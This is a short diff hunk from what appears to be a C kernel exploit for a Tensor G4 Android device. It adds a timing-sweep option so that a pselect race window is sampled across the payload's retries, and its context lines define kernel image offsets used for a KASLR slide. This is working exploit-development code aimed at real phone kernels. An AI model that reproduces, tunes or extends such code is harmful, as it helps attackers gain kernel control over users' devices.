@@ -196,6 +196,16 @@
 // (words 0..14) and never reaches the res_* half that core_sys_select memsets.
 #define SLIDE_PSELECT_WORD_SHIFT 3
 
+// Walk the slide timing grid across retries instead of using one fixed pair.
+// SLIDE_CONSUME_DELAY and PSELECT_ENTER_DELAY_USEC size the race window
+// between the waiter entering pselect and the consumer reprioritising it.
+// Nothing in the image derives them — they were measured on Tensor G5, and
+// this is a G4 with different clocks (4x1.95GHz + 3x2.6GHz + 1x3.1GHz), so
+// inheriting them is a guess either way. Sweeping turns the 20 retries the
+// payload already performs into 20 samples of the grid, and the per-attempt
+// log line records which pair was used so a success names the winner.
+#define SLIDE_TIMING_SWEEP 1
+
 #define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
 #define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
 #define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
